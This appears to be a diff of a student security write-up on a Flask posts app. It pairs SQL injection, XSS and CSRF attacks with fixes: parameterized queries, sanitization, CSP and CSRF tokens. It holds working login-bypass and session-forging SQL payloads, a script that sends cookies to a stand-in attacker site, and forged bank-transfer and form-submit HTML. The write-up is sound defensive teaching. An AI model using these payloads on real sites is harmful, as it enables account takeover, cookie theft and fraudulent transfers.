@@ -14,18 +14,18 @@ res = cur.execute("SELECT id from users WHERE username = '"
 With this, we can inject arbitrary SQL code, enabling the following attacks:
 
 - Logging into the first user retrieved by the query
-    - Username: `' OR '1'='1`
-    - Password: `' OR '1'='1`
+  - Username: `' OR '1'='1`
+  - Password: `' OR '1'='1`
 - Logging into a specific user if you know their username (e.g. “alice”)
-    - Username: `alice`
-    - Password: `' OR '1'='1`
+  - Username: `alice`
+  - Password: `' OR '1'='1`
 - Logging into some random user, assuming you don’t know anyone’s usernames
-    - Username: `' OR '1'='1`
-    - Password: `' OR '1'='1' ORDER BY random() --`
+  - Username: `' OR '1'='1`
+  - Password: `' OR '1'='1' ORDER BY random() --`
 - Log into every user’s account iteratively to find out all existing usernames
-    - Username: `' OR '1'='1`
-    - Password: `' OR '1'='1' LIMIT 1 OFFSET x --`
-        - where $x$ is in $[0,n-1]$ and $n=\text{number of users}$
+  - Username: `' OR '1'='1`
+  - Password: `' OR '1'='1' LIMIT 1 OFFSET x --`
+    - where $x$ is in $[0,n-1]$ and $n=\text{number of users}$
 
 ### Fix
 
@@ -43,7 +43,7 @@ res = cur.execute(
 
 ## Attack 2
 
-The  `/login`, `/home`,  `/posts`, and `/logout` endpoints above all perform their “user authentication” using a snippet that looks like this:
+The `/login`, `/home`, `/posts`, and `/logout` endpoints above all perform their “user authentication” using a snippet that looks like this:
 
 ```python
 if request.cookies.get("session_token"):
@@ -61,9 +61,9 @@ Notice that this “authentication” relies entirely on the `session_token` coo
 This enables the following attacks:
 
 - Pose as the user whose session token is retrieved first by the query:
-    - session_token: `' OR '1'='1' --`
+  - session_token: `' OR '1'='1' --`
 - Pose as the user whose session token is retrieved in some other row of the query:
-    - session_token: `' OR '1'='1' LIMIT 1 OFFSET n --`
+  - session_token: `' OR '1'='1' LIMIT 1 OFFSET n --`
 
 <aside>
 ⚠️ This attack is only limited to users who currently have a session in the `sessions` table (i.e. previously logged in and haven’t yet logged out).
@@ -86,24 +86,26 @@ if request.cookies.get("session_token"):
 
 ```
 
-## XSS Attacks
+# XSS Attacks
 
 ## Attack 1
 
-A user’s posts can contain arbitrary scripts. Simply paste a snippet like this into their `/home` endpoint, or send it via `POST /posts` directly. 
+A user’s posts can contain arbitrary scripts. Simply paste a snippet like this into their `/home` endpoint, or send it via `POST /posts` directly.
 
 ```html
-<script>alert("This is super dangerous!")</script>
+<script>
+  alert("This is super dangerous!");
+</script>
 ```
 
-When the victim loads their homepage, this script would run automatically. This is especially dangerous when combined with the exploit that lets us [log in as anyone](https://www.notion.so/Machine-Problem-3-fe13b74bfff44044ba20f8c2bf38cfe0?pvs=21), since we can inject malicious JS into other people’s accounts and the script would run next time they log in.
+When the victim loads their homepage, this script would run automatically. This is especially dangerous when combined with the exploit that lets us log in as anyone, since we can inject malicious JS into other people’s accounts and the script would run next time they log in.
 
 ### Fix
 
 We can completely disable new posts from being run as scripts by sanitizing the `<` and `>` characters. This prevents post names from being read as HTML elements, especially scripts.
 
 ```python
-message = request.form["message"].replace("<", "&lt;").replace(">", "&gt")
+message = request.form["message"].replace("<", "&lt;").replace(">", "&gt;")
 cur.execute(
 	"INSERT INTO posts (message, user) VALUES (?, ?)",
 	(message, user[0]),
@@ -127,14 +129,16 @@ con.commit()
 Suppose that an attacker was still able to inject a malicious script into the database, despite our sanitization of user inputs.
 
 ```html
-<script>alert("This is super dangerous!")</script>
+<script>
+  alert("This is super dangerous!");
+</script>
 ```
 
 Even if we implemented the sanitization fix from the previous attack, this would only apply to future posts. Pre-existing posts would still be able to execute malicious scripts whenever a user loads their homepage.
 
 ### Fix
 
-We can set the `Content-Security-Policy` header to disable inline scripts from being executed. `flask-csp` does this with default policies that are sufficient for our purposes. This policy only needs to be set in the home page because this is where posts (which may contain inline scripts) are rendered.
+We can set the `Content-Security-Policy` header to disable inline scripts from being executed. [flask-csp](https://github.com/twaldear/flask-csp) does this with default policies that are sufficient for our purposes. This policy only needs to be set in the home page because this is where posts (which may contain inline scripts) are rendered.
 
 ```python
 from flask_csp.csp import csp_header
@@ -148,16 +152,17 @@ def home():
    ...
 ```
 
-## CSRF Attacks
+# CSRF Attacks
 
 ## Attack 1
 
 Suppose that the following post was previously injected in the victim’s posts:
 
 ```html
-<img id="evil-image"/>
+<img id="evil-image" />
 <script>
-	document.getElementById("evil-image").src=`https://www.my-evil-site.com/?${document.cookie}`
+  document.getElementById("evil-image").src =
+    `https://www.my-evil-site.com/?${document.cookie}`;
 </script>
 ```
 
@@ -179,11 +184,11 @@ Suppose the victim is logged into `bangko.com.ph`. An attacker manages to inject
 <img src="https://bangko.com.ph/transfer?amount=10000&recipient=177013" />
 ```
 
-The next time the victim opens their posts in their browser, a request to `[bangko.com.ph](http://bangko.com.ph)` is automatically sent with their cookies attached, making it look like a genuine request from the user. The attacker could make arbitrary requests to other websites while piggybacking off the victim’s cookies.
+The next time the victim opens their posts in their browser, a request to [bangko.com.ph](http://bangko.com.ph) is automatically sent with their cookies attached, making it look like a genuine request from the user. The attacker could make arbitrary requests to other websites while piggybacking off the victim’s cookies.
 
 ### Fix
 
-We can prevent this attack using input sanitization, the [same fix](https://www.notion.so/Machine-Problem-3-fe13b74bfff44044ba20f8c2bf38cfe0?pvs=21) that prevents XSS attacks. This is because this type of attack relies on injecting new HTML elements.
+We can prevent this attack using input sanitization, the same fix that prevents XSS attacks. This is because this type of attack relies on injecting new HTML elements.
 
 ```python
 message = bleach.clean(request.form["message"])
@@ -220,7 +225,7 @@ Suppose there was some other malicious website (different from the one in the Ma
     <script>document.forms[0].submit()</script>
 ```
 
-Upon visiting this site, any user that’s logged in to our Posts website would be vulnerable to arbitrary posts being added to their account. This is extra dangerous when combined with the [XSS attack](https://www.notion.so/Machine-Problem-3-fe13b74bfff44044ba20f8c2bf38cfe0?pvs=21) from earlier, since they’d be able to run arbitrary scripts within the malicious post.
+Upon visiting this site, any user that’s logged in to our Posts website would be vulnerable to arbitrary posts being added to their account. This is extra dangerous when combined with the XSS attack from earlier, since they’d be able to run arbitrary scripts within the malicious post.
 
 <aside>
 💡 The previous attack does CSRF by forging requests from this website to other websites. This attack goes the opposite direction, forging requests from other websites to this website.
@@ -229,12 +234,12 @@ Upon visiting this site, any user that’s logged in to our Posts website would 
 
 ### Fix
 
-Th CSRF attack can be circumvented by adding a CSRF token. The third-party package [Flask-WTF](https://flask-wtf.readthedocs.io/en/0.15.x/csrf/) lets us protect the entire Flask app using CSRF tokens like so:
+This CSRF attack can be circumvented by adding a CSRF token. The third-party package [Flask-WTF](https://flask-wtf.readthedocs.io/en/0.15.x/csrf/) lets us protect the entire Flask app using CSRF tokens like so:
 
 ```python
 ...
 from flask_wtf.csrf import CSRFProtect
- 
+
  ...
 app = Flask(__name__)
 app.config["SECRET_KEY"] = secrets.token_hex()
